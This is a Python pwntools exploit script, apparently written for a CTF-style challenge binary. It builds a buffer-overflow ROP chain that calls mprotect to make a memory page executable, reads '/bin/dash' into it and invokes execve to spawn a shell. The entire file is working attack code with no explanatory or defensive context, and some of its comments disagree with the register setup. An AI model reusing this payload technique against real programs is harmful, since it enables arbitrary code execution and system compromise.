from pwn import *

# target RWX memory address
ch34 = 0x400000

# ROP gadgets
syscall = 0x400488
pop_rax = 0x44d2b4
pop_rdi = 0x4016d3
pop2ret = 0x437229     # POP RDX; POP RSI; ret

# functions()
mprotect    = 0x434e10
read        = 0x4342a0


# Overflow
payload = ""
payload += "A" * 280

# mprotect(ch34, 2000, 7)
payload += p64(pop_rdi)
payload += p64(ch34)
payload += p64(pop2ret)
payload += p64(0x7)
payload += p64(0x2000)
payload += p64(mprotect)

# read(1, '/bin/dash', 9)
payload += p64(pop_rdi)
payload += p64(0x1)		
payload += p64(pop2ret)
payload += p64(0x9)     
payload += p64(ch34)    
payload += p64(read)    

# execve('/bin/dash', 0, 0)
payload += p64(pop_rdi)
payload += p64(ch34)
payload += p64(pop2ret)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

print payload
